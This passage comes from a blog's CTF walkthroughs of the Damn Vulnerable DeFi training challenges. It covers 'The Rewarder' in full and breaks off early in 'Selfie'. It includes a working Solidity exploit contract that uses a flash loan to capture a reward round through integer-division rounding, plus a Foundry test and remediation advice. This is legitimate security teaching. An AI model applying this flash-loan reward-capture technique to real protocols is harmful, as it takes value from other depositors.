<p>Defines the minter role and the corresponding function to mint
reward tokens. It gives that minter role only to the contract creator:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">12</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">ERC20</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;openzeppelin-contracts/token/ERC20/ERC20.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">AccessControl</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;openzeppelin-contracts/access/AccessControl.sol&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">/**
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"> * @title RewardToken
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"> * @dev A mintable ERC20 with 2 decimals to issue rewards
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"> */</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">RewardToken</span> <span style="color:#728e00">is</span> <span style="color:#434f54">ERC20</span>, <span style="color:#434f54">AccessControl</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">bytes32</span> <span style="color:#728e00">public</span> <span style="color:#728e00">constant</span> <span style="color:#434f54">MINTER_ROLE</span> <span style="color:#728e00">=</span> <span style="color:#728e00">keccak256</span>(<span style="color:#7f8c8d">&#34;MINTER_ROLE&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">error</span> <span style="color:#434f54">Forbidden</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>() <span style="color:#434f54">ERC20</span>(<span style="color:#7f8c8d">&#34;Reward Token&#34;</span>, <span style="color:#7f8c8d">&#34;RWT&#34;</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">_setupRole</span>(<span style="color:#434f54">DEFAULT_ADMIN_ROLE</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">_setupRole</span>(<span style="color:#434f54">MINTER_ROLE</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">mint</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">to</span>, <span style="color:#00979d">uint256</span> <span style="color:#434f54">amount</span>) <span style="color:#728e00">external</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#728e00">!</span><span style="color:#434f54">hasRole</span>(<span style="color:#434f54">MINTER_ROLE</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>)) <span style="color:#728e00">revert</span> <span style="color:#434f54">Forbidden</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">_mint</span>(<span style="color:#434f54">to</span>, <span style="color:#434f54">amount</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div></li>
</ul>
 <!--list-separator-->
<ul>
<li>
<p>FlashLoanerPool</p>
<p>Just a regular flash loan pool implementation we already
familiar with. We can use it to borrow some DVT&rsquo;s by
implementing the <code>receiveFlashLoan(uint256)</code> function in our
<code>Exploit</code> contract:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">FlashLoanerPool</span> <span style="color:#728e00">is</span> <span style="color:#434f54">ReentrancyGuard</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">using</span> <span style="color:#434f54">Address</span> <span style="color:#728e00">for</span> <span style="color:#00979d">address</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">DamnValuableToken</span> <span style="color:#728e00">public</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">liquidityToken</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">error</span> <span style="color:#434f54">NotEnoughTokensInPool</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">error</span> <span style="color:#434f54">FlashLoanHasNotBeenPaidBack</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">error</span> <span style="color:#434f54">BorrowerMustBeAContract</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">liquidityTokenAddress</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">liquidityToken</span> <span style="color:#728e00">=</span> <span style="color:#434f54">DamnValuableToken</span>(<span style="color:#434f54">liquidityTokenAddress</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">flashLoan</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">amount</span>) <span style="color:#728e00">external</span> <span style="color:#434f54">nonReentrant</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">balanceBefore</span> <span style="color:#728e00">=</span> <span style="color:#434f54">liquidityToken</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#434f54">amount</span> <span style="color:#728e00">&gt;</span> <span style="color:#434f54">balanceBefore</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">NotEnoughTokensInPool</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#728e00">!</span><span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>.<span style="color:#434f54">isContract</span>()) <span style="color:#728e00">revert</span> <span style="color:#434f54">BorrowerMustBeAContract</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">liquidityToken</span>.<span style="color:#728e00">transfer</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">amount</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>.<span style="color:#434f54">functionCall</span>(
</span></span><span style="display:flex;"><span>            <span style="color:#728e00">abi</span>.<span style="color:#728e00">encodeWithSignature</span>(<span style="color:#7f8c8d">&#34;receiveFlashLoan(uint256)&#34;</span>, <span style="color:#434f54">amount</span>)
</span></span><span style="display:flex;"><span>        );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#434f54">liquidityToken</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>)) <span style="color:#728e00">&lt;</span> <span style="color:#434f54">balanceBefore</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#728e00">revert</span> <span style="color:#434f54">FlashLoanHasNotBeenPaidBack</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div></li>
</ul>
 <!--list-separator-->
<ul>
<li>
<p>TheRewarderPool</p>
<p>Let&rsquo;s examine public/external functions of this contract:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">deposit</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">amountToDeposit</span>) <span style="color:#728e00">external</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">amountToDeposit</span> <span style="color:#728e00">==</span> <span style="color:#8a7b52">0</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">MustDepositTokens</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#434f54">accToken</span>.<span style="color:#434f54">mint</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">amountToDeposit</span>); <span style="color:#95a5a6">// &lt;--
</span></span></span><span style="display:flex; background-color:#e5e5e5"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">distributeRewards</span>(); <span style="color:#95a5a6">// &lt;--
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">!</span><span style="color:#434f54">liquidityToken</span>.<span style="color:#434f54">transferFrom</span>(
</span></span><span style="display:flex;"><span>            <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>),
</span></span><span style="display:flex;"><span>            <span style="color:#434f54">amountToDeposit</span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>    ) <span style="color:#728e00">revert</span> <span style="color:#434f54">TransferFail</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>Requires the deposit to be greater than zero.</li>
<li>Mints an amount of rTKN&rsquo;s equal to the amount of deposited DVT&rsquo;s. These
rTKN&rsquo;s would be burned on withdrawal.</li>
<li>Calls the <code>distributeRewards</code>, which creates a new snapshot of
the deposited DVT&rsquo;s for each round and distributes the rewards.</li>
<li>Transfers the <code>amountOfDeposit</code> of DVT tokens from <code>msg.sender</code> to this contract.</li>
</ul>
<p>The <code>withdraw</code> function does two things:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">withdraw</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">amountToWithdraw</span>) <span style="color:#728e00">external</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">accToken</span>.<span style="color:#434f54">burn</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">amountToWithdraw</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#728e00">!</span><span style="color:#434f54">liquidityToken</span>.<span style="color:#728e00">transfer</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">amountToWithdraw</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">revert</span> <span style="color:#434f54">TransferFail</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>Burns the <code>amountToWithdraw</code> rTKN tokens.</li>
<li>Transfers DVT tokens to the caller account.</li>
</ul>
<p>Now, let&rsquo;s review the most interesting function in this contract:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">distributeRewards</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">uint256</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">rewards</span> <span style="color:#728e00">=</span> <span style="color:#8a7b52">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">isNewRewardsRound</span>()) {
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">_recordSnapshot</span>();
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">totalDeposits</span> <span style="color:#728e00">=</span> <span style="color:#434f54">accToken</span>.<span style="color:#434f54">totalSupplyAt</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">lastSnapshotIdForRewards</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">amountDeposited</span> <span style="color:#728e00">=</span> <span style="color:#434f54">accToken</span>.<span style="color:#434f54">balanceOfAt</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">lastSnapshotIdForRewards</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">amountDeposited</span> <span style="color:#728e00">&gt;</span> <span style="color:#8a7b52">0</span> <span style="color:#728e00">&amp;&amp;</span> <span style="color:#434f54">totalDeposits</span> <span style="color:#728e00">&gt;</span> <span style="color:#8a7b52">0</span>) {
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">rewards</span> <span style="color:#728e00">=</span> (<span style="color:#434f54">amountDeposited</span> <span style="color:#728e00">*</span> <span style="color:#8a7b52">100</span> <span style="color:#728e00">*</span> <span style="color:#8a7b52">10</span><span style="color:#728e00">**</span><span style="color:#8a7b52">18</span>) <span style="color:#728e00">/</span> <span style="color:#434f54">totalDeposits</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#434f54">rewards</span> <span style="color:#728e00">&gt;</span> <span style="color:#8a7b52">0</span> <span style="color:#728e00">&amp;&amp;</span> <span style="color:#728e00">!</span><span style="color:#434f54">_hasRetrievedReward</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>)) {
</span></span><span style="display:flex; background-color:#e5e5e5"><span>            <span style="color:#434f54">rewardToken</span>.<span style="color:#434f54">mint</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">rewards</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#434f54">lastRewardTimestamps</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">=</span> <span style="color:#728e00">block</span>.<span style="color:#728e00">timestamp</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">return</span> <span style="color:#434f54">rewards</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It uses snapshots to calculate the rewards. Users get their
rewards dependent on the amount deposited vs total deposits in
the current round:</p>
<p>\( \dfrac{amountDeposited × 100 × 10^{18}}{totalDeposits × 10^{18}} \)</p>
<p>To get the most reward tokens in the next
round we should deposit so many DVT&rsquo;s that the rewards for other
users will be negligible. If we take a flash loan and deposit \(
1000000 \) DVT&rsquo;s then our share will be so big that other users
will get \( 0 \) RWT&rsquo;s due to integer division rounding.</p>
<p>We can calculate the amount of reward tokens we&rsquo;ll get:</p>
<p>\( \dfrac{1000000 × 100 × 10^{18}}{(1000000 + 4 \times 100) × 10^{18}} =
\dfrac{100000000}{1000400} ≈ 99.96 \)</p>
<p>Now let&rsquo;s calculate the amount of RWT&rsquo;s for each user who deposited \(
100 \) DVT&rsquo;s:</p>
<p>\( \dfrac{100 × 100 × 10^{18}}{(1000000 + 4 \times 100) × 10^{18}} =
\dfrac{10000}{1000400} = 0 \) (because of
<a href="https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/integer-division/"  class="external-link" target="_blank" rel="noopener">integer
division</a>)</p>
</li>
</ul>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Solution</p>
<p>The <code>deposit</code> function immediately distributes the rewards.
Hence we have to get ahead of everyone and be the first with our
deposit in a new round. The <code>distributeRewards</code> uses the
snapshot to get the <code>totalDeposits</code> so we can withdraw the
deposited DVT&rsquo;s right away. Then we pay back the flash loan and
transfer all the rewards to the <code>owner</code> (attacker):</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Exploit</span> <span style="color:#728e00">is</span> <span style="color:#434f54">DSTest</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">TheRewarderPool</span> <span style="color:#728e00">private</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">rewarder</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">FlashLoanerPool</span> <span style="color:#728e00">private</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">flashLoaner</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">DamnValuableToken</span> <span style="color:#728e00">private</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">dvt</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">RewardToken</span> <span style="color:#728e00">private</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">rwt</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">private</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">owner</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#434f54">TheRewarderPool</span> <span style="color:#434f54">_rewarder</span>, <span style="color:#434f54">FlashLoanerPool</span> <span style="color:#434f54">_flashLoaner</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">rewarder</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_rewarder</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">flashLoaner</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_flashLoaner</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">dvt</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_rewarder</span>.<span style="color:#434f54">liquidityToken</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">rwt</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_rewarder</span>.<span style="color:#434f54">rewardToken</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">run</span>() <span style="color:#728e00">external</span> {
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">poolBalance</span> <span style="color:#728e00">=</span> <span style="color:#434f54">dvt</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">flashLoaner</span>));
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">flashLoaner</span>.<span style="color:#434f54">flashLoan</span>(<span style="color:#434f54">poolBalance</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">receiveFlashLoan</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">amount</span>) <span style="color:#728e00">external</span> {
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">dvt</span>.<span style="color:#434f54">approve</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">rewarder</span>), <span style="color:#434f54">amount</span>);
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">rewarder</span>.<span style="color:#434f54">deposit</span>(<span style="color:#434f54">amount</span>);
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">rewarder</span>.<span style="color:#434f54">withdraw</span>(<span style="color:#434f54">amount</span>);
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">dvt</span>.<span style="color:#728e00">transfer</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">flashLoaner</span>), <span style="color:#434f54">amount</span>);
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">rewardBalance</span> <span style="color:#728e00">=</span> <span style="color:#434f54">rwt</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>));
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">rwt</span>.<span style="color:#728e00">transfer</span>(<span style="color:#434f54">owner</span>, <span style="color:#434f54">rewardBalance</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can use the <a href="https://book.getfoundry.sh/cheatcodes/warp?highlight=vm.warp#examples"  class="external-link" target="_blank" rel="noopener">vm.warp</a>
to set the <code>block.timestamp</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">testExploit</span>() <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT START **/</span>
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// wait for the next round
</span></span></span><span style="display:flex; background-color:#e5e5e5"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">warp</span>(<span style="color:#728e00">block</span>.<span style="color:#728e00">timestamp</span> <span style="color:#728e00">+</span> <span style="color:#8a7b52">5</span> <span style="color:#00979d">days</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">attacker</span>);
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#728e00">new</span> <span style="color:#434f54">Exploit</span>(<span style="color:#434f54">theRewarderPool</span>, <span style="color:#434f54">flashLoanerPool</span>).<span style="color:#434f54">run</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT END **/</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">validation</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>And we passed the challenge! The forge&rsquo;s trace is too large to include
it right here %)</p>
<p>Maybe
<a href="https://gist.github.com/vyorkin/89b3d301e49990041a933068034fc7e6"  class="external-link" target="_blank" rel="noopener">this
sequence diagram</a> can help visualizing the interactions between
contracts.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Remediation</p>
 <!--list-separator-->
<ul>
<li>
<p>Get rid of snapshots and rounds</p>
<p>Don&rsquo;t distribute rewards right after the deposit. Implement
something like
<a href="https://solidity-by-example.org/defi/staking-rewards/"  class="external-link" target="_blank" rel="noopener">Staking
Rewards</a> to reward users for staking their token instead of
relying on snapshots and rounds.</p>
</li>
</ul>
 <!--list-separator-->
<ul>
<li>
<p>Multiply before dividing</p>
<p>Use the \( 10^{16} \) multiplier to fix the integer division rounding errors:</p>
<p>\( \dfrac{amountDeposited × 100 × 10^{36}}{totalDeposits × 10^{18}} \)</p>
<p>Now let&rsquo;s calculate how much users would get if we
used the above formula with multipliers:</p>
<p>\( \dfrac{100 × 100 × 10^{36}}{(1000000 + 4 \times 100) × 10^{18}} = \dfrac{10000 × 10^{18}}{1000400} = 9.9960016e+15 \)</p>
<p>This multiplier needs to be accounted for when working with the
result in the future.</p>
</li>
</ul>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li><a href="https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#ERC20Snapshot"  class="external-link" target="_blank" rel="noopener">ERC20Snapshot</a>
&ndash; Extends an ERC20 token with a snapshot mechanism.</li>
<li><a href="https://docs.openzeppelin.com/contracts/3.x/api/access#AccessControl"  class="external-link" target="_blank" rel="noopener">AccessControl</a>
&ndash; Allows children to implement role-based access control mechanisms.</li>
<li><a href="https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/integer-division/"  class="external-link" target="_blank" rel="noopener">Integer
Division</a> from Ethereum Smart Contract Best Practices.</li>
<li><a href="https://medium.com/@soliditydeveloper.com/solidity-design-patterns-multiply-before-dividing-407980646f7"  class="external-link" target="_blank" rel="noopener">Solidity Design Patterns: Multiply before Dividing</a>.</li>
<li><a href="https://solidity-by-example.org/defi/staking-rewards/"  class="external-link" target="_blank" rel="noopener">Staking
Rewards</a> &ndash; A minimal example of a contract that rewards
users for staking their token from <a href="https://solidity-by-example.org/"  class="external-link" target="_blank" rel="noopener">Solidity by Example</a>.</li>
</ul>
<hr>
<p>The solution/exploit code is <a href="https://github.com/vyorkin/damn-vulnerable-defi-solutions/blob/master/src/test/Levels/the-rewarder/TheRewarder.t.sol#L15-L44"  class="external-link" target="_blank" rel="noopener">here</a>.
This one was a bit trickier! Let&rsquo;s see whats next &ndash;
<a href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-6-selfie" >#6 Selfie</a>.</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Damn Vulnerable DeFi, #6 Selfie</p>
<p>After a short break, I&rsquo;m back and excited to keep going with
these CTF walkthrough series.</p>
<p>The current challenge is <a href="https://www.damnvulnerabledefi.xyz/challenges/6.html"  class="external-link" target="_blank" rel="noopener">Selfie</a>:</p>
  <!--list-separator-->
<ul>
<li>
<p>Challenge</p>
 <div class="quote2">
<p>A new cool lending pool has launched! It&rsquo;s now offering flash
loans of DVT tokens. Wow, and it even includes a really fancy
governance mechanism to control it. What could go wrong, right?
You start with no DVT tokens in balance, and the pool has 1.5
million. Your objective: take them all.</p>
 </div>
<p>Looks like we might be able to abuse the governance using a
flash loan to drain all the funds. We&rsquo;ll see ;)</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Analysis</p>
<p>There are 3 contracts that may be of interest to us:</p>
<ul>
<li><code>SelfiePool</code> &ndash; Offers flash loans. Managed by governance.</li>
<li><code>SimpleGovernance</code> &ndash; Allows to queue and execute &ldquo;proposals&rdquo;.</li>
<li><code>DamnValuableTokenSnapshot</code> &ndash; ERC20 token with a snapshot mechanism.</li>
</ul>
 <!--list-separator-->
<ul>
<li>
<p>SelfiePool</p>
<p>It provides the same flash loan functionality we have already
seen many times before, expect that it has one extra function
<code>drainAllFunds</code> that relies on governance. This function allows
transfering all DVT&rsquo;s to the given address and it is guarded by
the <code>onlyGovernance</code> modifier:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">drainAllFunds</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">receiver</span>) <span style="color:#728e00">external</span> <span style="color:#434f54">onlyGovernance</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">amount</span> <span style="color:#728e00">=</span> <span style="color:#434f54">token</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>));
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">token</span>.<span style="color:#728e00">transfer</span>(<span style="color:#434f54">receiver</span>, <span style="color:#434f54">amount</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">emit</span> <span style="color:#434f54">FundsDrained</span>(<span style="color:#434f54">receiver</span>, <span style="color:#434f54">amount</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This modifier makes sure that the function is being called by the
governance contract:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">modifier</span> <span style="color:#d35400">onlyGovernance</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span> <span style="color:#728e00">!=</span> <span style="color:#00979d">address</span>(<span style="color:#434f54">governance</span>)) <span style="color:#728e00">revert</span> <span style="color:#434f54">OnlyGovernanceAllowed</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">_</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>All we need to do is to make the governance contract call the
<code>drainAllFunds</code> function somehow.</p>
</li>
</ul>
 <!--list-separator-->
<ul>
<li>
<p>SimpleGorvernance</p>
<p>It has 2 functions to queue and execute action proposals:
